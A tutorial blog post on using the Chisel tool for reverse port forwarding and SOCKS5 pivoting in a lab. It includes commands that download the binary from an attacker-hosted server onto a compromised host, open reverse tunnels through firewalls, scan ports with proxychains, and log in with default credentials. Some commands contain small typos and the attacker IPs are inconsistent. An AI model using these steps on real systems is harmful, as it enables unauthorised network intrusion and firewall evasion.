<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/tunneling-pivoting/" rel="category tag">Tunneling &amp; Pivoting</a></span>            </div>
            <h1 class="post-title entry-title">A Detailed Guide on Chisel</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/chisel-port-forwarding-a-detailed-guide/" rel="bookmark"><time class="entry-date published" datetime="2023-03-25T10:18:23+00:00">March 25, 2023</time><time class="updated" datetime="2025-06-19T19:52:22+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Chisel port forwarding is a powerful technique that penetration testers and red teamers commonly use to bypass firewalls and securely access internal services. This guide explores how to use Chisel for tunneling traffic and setting up remote connections through local port forwarding and SOCKS5 proxies in various real-world scenarios.</span></p>
<h3><span style="color: #800000;">Table of content</span></h3>
<ul>
<li><strong><span style="color: #000000;">Introduction to Chisel</span></strong></li>
<li><strong><span style="color: #000000;">Background of port forwarding</span></strong></li>
<li><strong><span style="color: #000000;">Establish a connection with the remote host</span></strong></li>
<li><strong><span style="color: #000000;">Local port forwarding Example – 1</span></strong></li>
<li><strong><span style="color: #000000;">Local Port forwarding Example – 2</span></strong></li>
<li><strong><span style="color: #000000;">Establish Connection with SOCKS5 Proxy</span></strong></li>
<li><strong><span style="color: #000000;">Configure SOCKS5 in proxychains4.conf file</span></strong></li>
<li><strong><span style="color: #000000;">Banner grabbing of the remote host with proxychains</span></strong></li>
<li><strong><span style="color: #000000;">Telnet Connection using proxychains</span></strong></li>
<li><strong><span style="color: #000000;">FTP connection using proxychains</span></strong></li>
<li><strong><span style="color: #000000;">VNC Viewer connection using proxychains</span></strong></li>
<li><strong><span style="color: #000000;">Conclusion</span></strong></li>
</ul>
<h3><span style="color: #800000;">Introduction to Chisel</span></h3>
<p><span style="color: #000000;"><strong data-start="580" data-end="590">Chisel</strong> is an <strong data-start="597" data-end="618">open-sourced tool</strong> written in <strong data-start="630" data-end="645">Go (Golang)</strong>. It mainly helps users <strong data-start="669" data-end="695">pass through firewalls</strong>, although it can also provide a <strong data-start="728" data-end="747">secure endpoint</strong> into your network. Specifically, it operates as a <strong data-start="802" data-end="825">fast TCP/UDP tunnel</strong>, transported over <strong data-start="844" data-end="852">HTTP</strong> and secured via <strong data-start="869" data-end="876">SSH</strong>. To establish a connection between a <strong data-start="914" data-end="929">remote host</strong> and the <strong data-start="938" data-end="955">attacking box</strong>, it requires two components: the <strong data-start="989" data-end="1006">attacking box</strong>, which acts as the <strong data-start="1026" data-end="1036">server</strong>, and the <strong data-start="1046" data-end="1061">remote host</strong>, which acts as the <strong data-start="1081" data-end="1091">client</strong>.</span></p>
<h3><span style="color: #800000;">Background of Port forwarding</span></h3>
<p><span style="color: #000000;">Port forwarding in a computer network, also known as port mapping of network address transition (NAT), redirects a communication request from one address and port number combination to another while packets traverse a network gateway such as a firewall or a router. It is used to keep unwanted traffic off. A network administrator uses one IP address for all external communications on the internet while dedicating multiple servers with different IPS and ports internally to do various tasks based on organization requirements.</span></p>
<h3><span style="color: #800000;">Establish a connection with the remote host</span></h3>
<p><span style="color: #000000;">We establish a <strong data-start="1102" data-end="1128">connection</strong> with the <strong data-start="1138" data-end="1153">remote host</strong> using <strong data-start="1160" data-end="1181">valid credentials</strong>. The <strong data-start="1187" data-end="1202">remote host</strong> serves as both a <strong data-start="1220" data-end="1230">target</strong> and a <strong data-start="1237" data-end="1256">tunneling point</strong> for the next hop. If another hop exists, the <strong data-start="1306" data-end="1321">remote host</strong> functions as a <strong data-start="1337" data-end="1354">routing point</strong>. We connect as the pentest user using the <strong data-start="1401" data-end="1417">SSH protocol</strong>, which stands for <strong data-start="1436" data-end="1459">Secure Socket Shell</strong> and <strong data-start="1464" data-end="1500">transmits </strong>data in encrypted form. Once connected, we can view the internal network status, which we can achieve using the following <strong data-start="1604" data-end="1616">commands</strong>.</span></p>
<ul>
<li><span style="color: #000000;">-a all interface</span></li>
<li><span style="color: #000000;">-n show ip address</span></li>
<li><span style="color: #000000;">-t show tcp connections</span></li>
<li><span style="color: #000000;">-p show process id/name</span></li>
</ul>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh pentest@192.168.1.15
netstat -antp</pre>
<h3><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsfONWd3XCtaSiASU7ZqQ6Bp1NN3DPCp5UIwhslLXRuppOgCrjnj19r2g8ja0MWPgqZnp1a89lO33n4r0OczaSN17JI7ePGEiUIj-V332kQ7TwQS8nQjyyE7QAEh5rV4TalPr0AZ6jpJnGlH7izyPyf7TKSZTbgOzBTV-VndwVsV2Dt1b0KowYSQ2SXQ/s16000/1.png"/></span></h3>
<h3><span style="color: #000000;"><span style="color: #800000;">Installation</span> </span></h3>
<p><span style="color: #000000;">Chisel installation is straightforward in Kali Linux as it comes with a distribution package. We can install it using the below command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install chisel</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8ewRwLH_EJQnTTxkdn2-5PaN1TmGbuMMBoD-HmvJdP2rhe7dwBjiIvzaTDco948tueK3LBmuHMtgnz4h69HDXVqMQy7Humg0z9uA1WrfLwW_DFUEkHRhYrbvCBFDw1eHgKJZohSid6vQjosPqRBWHUmDXfAUVcYbL8qF7obZrBHWbt91bTOr3K9BodA/s16000/2.png"/></span></p>
<p><span style="color: #000000;">Once installed, <strong data-start="1147" data-end="1173">Chisel port forwarding</strong> becomes an indispensable part of any attacker’s toolkit for navigating complex network environments.</span></p>
<h3><span style="color: #800000;">Local port forwarding Example – 1</span></h3>
<p><span style="color: #000000;">In reverse port forwarding, it allows connecting to remote services hosted in an internal network. Here we are using a chisel utility to achieve our goal. It will require you to go through multiple steps. In the first step, we set up a reverse server in our base machine (Kali) by specifying a port number of 5000.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiStySIg2yNgPuf7HzAfiNCM6pn6m7BzmTKkjPAjPFDHIfP7iiK4tq7W01K2TzAbt6H7lgnOcoF6244s9hs9i3XhtGlxHt3Iusyza1pgyFiZVulKQULRo0ICzJqexJ3h4sXl1TRsxwB1JOuhm3dWTV9m3-DUXzsuik6pLNt9tdO61M-bDFL5YvJ26odYg/s16000/3.png"/></span></p>
<p><span style="color: #000000;">Once our <strong data-start="1624" data-end="1659">Chisel server is ready</strong> and <strong data-start="1664" data-end="1696">reverse tunneling is enabled</strong>, we must <strong data-start="1706" data-end="1734">transfer a Chisel binary</strong> to the <strong data-start="1742" data-end="1757">remote host</strong>. You can download the <strong data-start="1780" data-end="1799">Chisel binaries</strong> from the <strong data-start="1809" data-end="1832">official repository</strong> based on your <strong data-start="1847" data-end="1870">system architecture</strong>. All the latest binaries are available under the <strong data-start="1924" data-end="1940">releases tab</strong>. As we are testing on a <strong data-start="1965" data-end="2005">Linux system </strong>with<strong data-start="1965" data-end="2005"> AMD64 architecture</strong>, we selected the highlighted binary.</span></p>
<p><span style="color: #000000;">Download link: <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/jpillora/chisel/releases">https://github.com/jpillora/chisel/releases</a></strong></span></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEithVHBbhdyrAvfL2gr0Zr9tiNcl08i-sK9oeNa9Z1y4pqdOfqEIaBnmHPvY2ID06fpSL4uru0pOkXSLGarpTVSKNv6L-oJYPpQknUpk-Cb_GS1nE2BnE-UaIJoiff7CqIFTrPF6un4RBe3QaX1Bcq38MqjQLcPgg80tHWGNlCWMwqNMR4FOMaMy9e_Cw/s16000/4.png"/></span></p>
<p><span style="color: #000000;">After cloning the repository, it will be saved in the downloads folder in zip file format. Next, we will unzip the file using <strong>the gunzip</strong> utility. As mentioned earlier, we require to transfer it to the target system to set up a chisel as a client. To transfer the file, we set up a python server in our local system, which will host our file on port 80.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">gitclone https://github.com/jpillora/chisel.git
gunzip chisel_1.7.7_linux_amd64.gz
python3 -m http.server 80</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjW5uurS4bO12NvQPalYP7sbcvbBGKt6_vy0Nnl63K26sP4g5egBdPn8pfE4CmEzQXQZOuPkVatOCP1-iHVWvlKYjE3bhUnl89ebeN5gHIMfV0ouEc1qXljH816rF2bzCBN6NUF_Vd4o1spaUcCpZPHOgJIzF8JUFZttEzWkUJ3gvpIhuYjBi0ew3Uw3g/s16000/6.png"/></span></p>
<h5><strong><span style="color: #000000;">Transferring and Executing Chisel on the Remote Host</span></strong></h5>
<p><span style="color: #000000;">We <strong data-start="2056" data-end="2088">downloaded the Chisel binary</strong> into the <strong data-start="2098" data-end="2132">remote host’s <code data-start="2114" data-end="2120">/tmp</code> directory</strong>, where all users have <strong data-start="2155" data-end="2175">full permissions</strong>. Then, we <strong data-start="2186" data-end="2225">assigned full execution permissions</strong> to the binary file. Otherwise, if we don’t grant proper permissions, we cannot execute it, as the default setting assigns only <strong data-start="2357" data-end="2376">read permission</strong> for files downloaded into <code data-start="2403" data-end="2409">/tmp</code> as a <strong data-start="2415" data-end="2438">low-privileged user</strong>. To <strong data-start="2443" data-end="2476">establish a remote connection</strong>, we need both a <strong data-start="2493" data-end="2510">Chisel server</strong> and a <strong data-start="2517" data-end="2534">Chisel client</strong>. The <strong data-start="2540" data-end="2557">Chisel server</strong> is the <strong data-start="2565" data-end="2582">attacking box</strong>, while the <strong data-start="2594" data-end="2611">Chisel client</strong> is the <strong data-start="2619" data-end="2637">target machine</strong>. As we had already <strong data-start="2657" data-end="2678">set up the server</strong> on <strong data-start="2682" data-end="2695">port 5000</strong>, we now <strong data-start="2704" data-end="2730">establish a connection</strong> to it. In this setup, we designate <strong data-start="2766" data-end="2790">Chisel as the client</strong>, specify the <strong data-start="2804" data-end="2825">server IP address</strong> and <strong data-start="2830" data-end="2852">port number (5000)</strong>, followed by an <strong data-start="2869" data-end="2894">accessing port (4444)</strong> and the <strong data-start="2903" data-end="2933">internal HTTP service port</strong> on the <strong data-start="2941" data-end="2958">remote system</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget 192.168.1.205/ chisel_1.7.7_linux_amd64
chmod 777 chisel_1.7.7_linux_amd64
./chisel_1.7.7_linux_amd64 client 192.168.68.141:5000 R:4444:localhost:8080</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXBQ0-pIZHHSTazXNV8IraqUdTcrVfimbl97UlITQ82i9GaQX7n0_EhA2QGnXoWc7H8qEx7WV3H5GHCeQF0eWfXtAPWfQu9hA0SBJlUvLBKBHmyiLn6w4dOOZhhAPGjUrouogitnZ4Ck2qsk4-xKWYXV5ThI934F9Ac5VSKzTwQziW2gS8GLVHyynxbQ/s16000/7.png"/></strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEilHbxELY_FVcEjHgzEx47wwB3GWxbsFFssJV8ePMEkFKexlRXYmBpRhZkh1-Sr2CLhYqvdbhs0A3k2a_ZFVaL49r5KllrOxS9PtdNP2o5V3ubfrRfyDFqd4ccUW5NX_z_PNiNZ2g7CgTd2NU-pFp7q1TfLnG0TZXVIf6bdl1Ft2nTwf8UkMO13e8AISA/s16000/8.png"/></span></p>
<h3><span style="color: #800000;">Local Port forwarding Example – 2</span></h3>
<p><span style="color: #000000;">Alternatively, we can <strong data-start="2992" data-end="3028">access the internal HTTP service</strong> using the <strong data-start="3039" data-end="3064">attacker’s IP address</strong> instead of the <strong data-start="3080" data-end="3102">loopback interface</strong>. To do so, we must <strong data-start="3122" data-end="3140">install Chisel</strong> on the <strong data-start="3148" data-end="3166">target machine</strong>. In this case, we are using an <strong data-start="3198" data-end="3215">Ubuntu system</strong>. Because <strong data-start="3225" data-end="3235">Chisel</strong> is written in <strong data-start="3250" data-end="3260">Golang</strong>, we need to <strong data-start="3273" data-end="3291">install Golang</strong> on the <strong data-start="3299" data-end="3316">target system</strong> using the command below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install golang</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh1xiUWsddjbhXzEFGFxiQhgVKUuNsjNcnqWMA4QNetOonYTjNkf_0BpGOFS_v9u0hzPeJo4hm9aLMb3QiiGAs-ce0pQYTNuVVlDtwEaAWYBD_9zOBXgT7Pv3dfe-AFZKiyCQ7Dtrq9QrJuWVMPh3eUZaRbq6Nni0-cWfnBMgDbGjQGKucSAZnI1f-7iw/s16000/11.png"/></span></p>
<p><span style="color: #000000;">Next, we <strong data-start="3361" data-end="3380">download Chisel</strong> from its <strong data-start="3390" data-end="3413">official repository</strong> to <strong data-start="3417" data-end="3431">install it</strong> on the <strong data-start="3439" data-end="3456">target system</strong>. The <strong data-start="3462" data-end="3474">Go build</strong> tool, which aims to <strong data-start="3495" data-end="3516">replace Makefiles</strong>, automates builds for <strong data-start="3539" data-end="3561">simple Go projects</strong>. It creates a <strong data-start="3576" data-end="3596">dependency graph</strong> of all local imports and compiles them in the correct order using the <strong data-start="3667" data-end="3685">GC Go compiler</strong>. The <strong data-start="3691" data-end="3702">ldflags</strong> (linker flags) allow users to pass parameters to the <strong data-start="3756" data-end="3777">underlying linker</strong> in the Go toolchain. Although not mandatory, the <code data-start="3827" data-end="3831">-s</code> and <code data-start="3836" data-end="3840">-w</code> linker flags help <strong data-start="3859" data-end="3881">reduce binary size</strong>. By navigating to the <strong data-start="3904" data-end="3930">Chisel download folder</strong>, we can <strong data-start="3939" data-end="3960">easily install it</strong> using <strong data-start="3967" data-end="3979">go build</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/jpillora/chisel.git
apt install golang
go build -ldflags="-s -w"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiScK9uZQBVgxDY2tS5NDhzxu6iLaMXGy3r3RxUEDS__cq8c_3hrJtNiPwIG0ZSVES7MYuAthAQH48eUKW5-33YSvvCfZARKUnvdt7-ZiYapZLCta4Js3CyZiSwuWvtN4X0lVXT5dJmCbiNKk_Ww31u_kWOCaxiBmeBt3rxV97v9U14oQiMHXI1V8JMvw/s16000/12.png"/></span></p>
<p><span style="color: #000000;">Then we set up a chisel server on port 5000 in the attacking box as in the previous example. In the last example, we accessed it from the attacking box loopback interface, connecting to the service hosted in the remote internal network. This time we will access the HTTP service on port 8888 on the attacker side. Ubuntu machine, our client, will establish a connection with the remote server (192.168.1.205) and port 5000. Once a tunnel is created, it will allow accessing the HTTP service hosted in loopback (127.0.0.1) on remote port 8888.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./chisel client 192.168.1.205:5000 R:8888:localhost:8080</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3EVdzpWIuHXefKp32wxsLTpGQqR5KaKZFsEbnBviSFgGmIm2623vJ-O4gUYDOCIs56n5wHIlCnUpO0kdZ-dNHrL_Oa3-waFuFjyBCMHuTyViGqiGQciYblmlJyoHZda_ueS-p0xfJkTig1MI9EX5v202nGUfHHkcjgzibGiWSGx5WzM7-VyY1A0Ni4w/s16000/13.png"/></span></p>
<p><span style="color: #000000;">When a connection is established with the chisel server, we can access the HTTP service from the attacking box on port 8888.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgG45Ip4x9vmMGyxSzSvQey6WuOIPngDiPSUq8EnrUwNHz14mkInvOMiIqVjxRIl1Z3kDiMF-7gihKjzY4dNnRGev6_4GS1KMSI770zuolhnvYDo5U30RmyaRLqknoWgeGqQecgA7nrM4rDKwUhCpWPyJcugBjfCfBu7Ejx7T25GTNo504qq0d_ylpkxA/s16000/14.png"/></span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Establish Connection with SOCKS5 Proxy</span> </span></h3>
<p><span style="color: #000000;">During the internal assessment, we may come across when we compromise a system, and that system is communicating with another system using a different adaptor or a different subnet. It can be checked using ipconfig/ifconfig, where we can view if that system is connected to a different network via a different adapter. In such scenarios, local port forwarding will not work, and we have to identify which ports are open for the outbound traffic. As shown in the screenshot below, we could not establish a connection with the remote host.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIb5IlaspoDDBtROcBiHFR_GQ5cEyHPmH_hIiWAraYd2YH026fwhwZc78Ra7_z95TjZNXQbLnjPX6OFbTS-VSporsstn-EgTitcUYniYnYv22SeNI_y7CVa5tw2IRwwVY2dX7OWtyopSu7vHizMlNGDxS2Qd4GB-WPyN7029Le7cjwNo0XY5vAWW3dJQ/s16000/50.png"/></span></p>
<p><span style="color: #000000;">To overcome this issue, we have to go through multiple steps. First, we set up a chisel server in the attacking box on port 8000. </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhwtIdd5g14Pgc6TMkrDnCgqpFV51bKYSeWHTSijHz5PDwBMQKRdX1bMVLzdPs_5g3UTaCockqmvUnJZpKRmy0l53nslau84VMdjpVx6cmk3sh2BTNPi6PJVujKYERjm9A_adbECCKMJlakIyRbboiLhDkBWiElfbz5puoSydd450xrdSXMj7K9vNfgJQ/s16000/51.png"/></span></p>
<h5><span style="color: #000000;"><strong>Configuring and Using SOCKS5 Proxy for Forwarding</strong></span></h5>
<p><span style="color: #000000;">Then we establish a connection with the chisel server from the ubuntu box mentioning remote access on socks proxy. Just like most other proxy types, SOCKS proxies hide the client’s IP address and serve when bypassing geo-restrictions. Unlike HTTP, SOCKS cannot interpret web data. However, users mainly use them to facilitate communication with websites that have firewalls and limit regular client access. All communication can occur on a SOCKS5 proxy using utilities such as proxychains or proxychain4.</span></p>
<p><span style="color: #000000;"><strong>-p</strong>: listening port of the server (attacking box)</span></p>
<p><span style="color: #000000;"><strong>–socks5</strong>: start an internal SOCKS4/SOCKS5 proxy</span></p>
<p><span style="color: #000000;"><strong>–reverse</strong>: allows reverse port forwarding</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjSadLiGNyndAqSoWJjEpM7aNbIJ09ngDWD7m7fEMp5yF8yZ8-5sQ-4OuCAlAPj8XTpTtFh6jU50ImiQYLpLFePiilb_V9BrfuCOtXXqMFfmKEv8F68-BmvLrqnoAPv2Fk0_TRt8bFlNtkiKm_s7ZI69_ozJYYnzFhhbG8i1q3bj4X-lwFzmcM2cbKN9Q/s16000/52.png"/></span></p>
<p><span style="color: #000000;">We can also access an individual target’s port using the command below. We connect with the server hosted in the Attacking machine and then access the target service via a tunnel.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjzCUUu-ud2gExkxfqRtnP_YCSSQu84Z8_RDP8opl5In2hccNcbbA0BA1SvSdRYkSx4mKK-t1T-14zgfkFF7EWXD1S633DoBCv0cIusmo8bl27Cf1U-U3hAI_k9a5JXXqJp77BZ5QHDFi_z4Ipe_-4GNpK1hJoTie8bporQyD44TFitFJtHSSN0xACYOw/s16000/53.png"/></span></p>
<p><span style="color: #000000;">Also, we can specify socks proxy while setting up the chisel server. In the below example, we have set up a chisel server on port 9001 using the socks5 proxy.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhflKNati91HjhPDLDzUJ8sMY_becQ_N_8Pi2_8xSNb2kAdIlCI4qdVCwid2biQ2lPT3_XPwm6nX0b8yzUTS2EjAMViKR0DZdNWj5l-WvHc_ApKIC2axAQnvZ-AghJUmLtBD5HaC6IASDxA2NQOVT1KoWww52Rwxhzp0vG2Gt-YhGhdcbUN5NefTWcVLg/s16000/54.png"/></span></p>
<p><span style="color: #000000;">All the above setup is done at the system level, but how will the browser know we want to access HTTP service? So, we configured it in the browser as well. Otherwise, we cannot browse any HTTP or H TTPS services. To do that, we manually configured our browser by navigating settings as proxy SOCKS and a host as loopback interface IP address, 127.0.0.1, and SOCKS version such as SOCKS4 or SOCKS5, which depend on the version we are using. In this example, we are using SOCKS5 and port number 1080. And no proxy for the loopback interface. It can also be done using the foxyproxy addon available in Mozilla Firefox.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhCg1DbmJuOL1i-laJ4sYaId65bjON4g6C7Gs27avh4ua40nSZfiZtguGKyqoyct6RY1iWsqB1nA6omRKs_RLmNinxsRZKN5kiWAuePkJLbva6YbwMEkyR2XdaKc0J2zrbGLMLNsubqlF5_6YsdApGhNOJ0IIrGqgOqo1maKFnX9BxyrlqwbsM2gSeT0Q/s16000/55.png"/></span></p>
<p><span style="color: #000000;">Now we can access the services without any issues. We can verify accessing the target HTTP service where the request will send via a proxy.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrfN8CdH9fzLSFsFt-f-URFk44SZPcIJ3x-TDCw10RLI61Nu3fNtzrnEfL9nx-bYr4cwx6eijGKSy_Q-oGvZR-_nVrUTB847QvwmOmHMoqVE4n9asPkzz0p2ELczSmZn42jexn_d8-WHPDM7bUiO1LXeyl3-T-DcW9XeB0Af9WC94KMGCmxAgrY-Z9SA/s16000/56.png"/></span></p>
<p><span style="color: #000000;">In situations where traditional forwarding fails due to network segmentation, <strong data-start="1630" data-end="1656">Chisel port forwarding</strong> combined with SOCKS5 proxy can help create dynamic tunnels across subnets.</span></p>
<h3><span style="color: #800000;">Configure SOCKS5 in proxychains4.conf file</span></h3>
<p><span style="color: #000000;">If proxychains4 is not configured for the socks5 proxy, we can make an entry in its configuration file using any text editor. The configuration file is located in the /etc as proxychains4.conf.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgG8XNxsP5muvMdb50FpQDBKxqr01CiASx6QsUOQpISK3H8xMKmqb18pGpGri5nVgU7Ca5LtYfiSJ7DYdwk0QKy61bpSxBRyGTdcr_UANC2OWihDNykdmrTQ99MWUHxeOELipU3-79npcRLUF-Rt_HB1rveFAxTSFQ_b9KOq9ZmPLDNUtsapep7-G_lqw/s16000/57.png"/></span></p>
<p><span style="color: #000000;">To edit the configuration file, we need to comment out the socks4 proxy if the system has configured it by default and add socks5 on the loopback interface with the port number. We can use any port, but in this example, we use port 1080.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiXcChK_Cd5-A6oUu-bCE3MyPxah_YMa182z7HAv-YqfjLRCslwu-htQzgCWkFkyETD9gSYkG5155CXASVBTzDBHCE7YNL1TTJweQCjc5SL_9neY5XW8rjUKGdUNQvP8bP3hwvDhTjC6bSmak9qSBdkTgcBhBJV9feey3bt5-GAjZaWh2I9JbV-wI6Tyg/s16000/58.png"/></span></p>
<h3><span style="color: #800000;">Banner grabbing of the remote host with proxychains</span></h3>
<p><span style="color: #000000;">Now, let’s grab the banners of ports 21, 23, and 5900. Port 21 corresponds to FTP (File Transfer Protocol), 23 to Telnet, and 5900 to the VNC server. FTP helps transfer files, while Telnet allows remote CLI-based connections, and VNC supports GUI-based remote connections. To grab these banners or access the remote host, we must use proxychains before running any commands so that the request is routed through the tunnel we established. From the output, it’s clear that all three ports are open. In our command, we used the <code data-start="4593" data-end="4599">-zvn</code> options, which stand for:</span></p>
<ul>
<li><span style="color: #000000;">-n Do not do DNS or service lookups on specified addresses, hostnames, or ports.</span></li>
<li><span style="color: #000000;">-v Have nc give more verbose output.</span></li>
<li><span style="color: #000000;">-z Specifies that nc should only scan for listening daemons without sending any data to them.</span></li>
</ul>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">proxychains nc -zvn 192.168.146.128 21 23 5900</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCoy98yOyiUqx3aXSYHdwXLkxMX2icX2pHfCxh-bolJv0MMdJOwZ1u36xMQ3Q6qrUWV2kK58t9tppYtAAOE_LVn95Th8Gdy-FGYWZvFT3VlzvTu1XnR_u1a6LtUhzl3zD10yY_NiQJd16JxQ79iHW7zSEydu7VnNh5K8CQoUAQVgk_azJ8e9sf9h18Zg/s16000/59.png"/></strong></span></p>
<h3><span style="color: #800000;">Telnet Connection using proxychains</span></h3>
<p><span style="color: #000000;">Telnet is a remoting protocol that does not encrypt the data while transmitting. It transmits data in a plain text format. Let’s establish a telnet connection with valid credentials msfadmin/msfadmin. As expected, we successfully established a remote connection with the remote host using telnet protocol.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic"> proxychains telnet 192.168.146.128</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRp3rPcWYeCO6pRLxp3GJbucTecWuR7kbl2WMXEMmybd4sr9vOLm1p_EzIDmirVnXsJVGKZcfsz4r2q1OE4kSep3XrsWEosC_8J3-0P205F54swR3nZzr7QaXuJYT97_FLkeY5ZJEXDWHZgA1i7yLhQFrGNkBZg6qQ9ObJ9PB0x8iHDMnlCA7TxxceIg/s16000/60.png"/></strong></span></p>
<h3><span style="color: #800000;">FTP connection using proxychains</span></h3>
<p><span style="color: #000000;">FTP (File Transfer Protocol) is a network protocol for transmitting files between computers over Transmission Control Protocol/Internet Protocol (TCP/IP) connections. Within the TCP/IP suite, FTP is considered an application layer protocol. Let’s connect with the same credentials we used in telnet. We connected to ftp successfully, and with <strong>ls</strong> command, we can list the available file in the directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">proxychains ftp 192.168.146.128</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9NbFkm5qGjCpRxxU8PCogankPsziQyyZSwoB6bp9X-xo7895CpD_miBGv8_zPaxDZ1iw_4pQWgwe0Bm0nz0NKPFA_ep-8U0j8DQrYkQYV3cryBCCkI6djmC90QQ-D4DZCvZfVjWFGvvcAfecLE0rfod8HEMmz4B1rTBBNB8XoyCgW2kswbxbiKnzi6A/s16000/61.png"/></strong></span></p>
<h3><span style="color: #800000;">VNC Viewer connection using proxychains</span></h3>
<p><span style="color: #000000;">In the last example, we will connect with the VNC viewer. VNC Viewer is used for local computers and mobile devices you want to control from. A device such as a computer, tablet, or smartphone with installed VNC Viewer software can access and control a computer in another location. This service runs in its default port, 5900. To establish a connection with VNC, we can use proxychains using the vncviewer utility and the remote IP address, and we will receive a GUI-based interface.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">proxychains vncviewer 192.168.146.128</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0Tt56mfpGglKdxTNrvbX94g_twEACgzdw3Q6TalNR4ygyHNcT6TtWkXs6VfTV1BrYt3qdcUgWAuKR4g5owtsKwIjQwoZ1YiPtLKBAvh1T6Ucn-h3zm9HpxLORdGHTGKYw4lTzVI5YfUnFRX1Xh-8MR7-UVPaPmLT0SgEHT0teqgEUmSltssFnBDgfAQ/s16000/62.png"/></span></p>
<h3><span style="color: #800000;">Conclusion</span></h3>
<p><span style="color: #000000;">We have explored chisel briefly, which will make our Internal assessment much easier, especially when we come across port forwarding. We have explored multiple techniques to establish a remote session using a chisel with and without socks5 proxy. Also, we have explored proxychains role in a tunneled connection. I hope you have learned something new today. Happy hacking!</span></p>
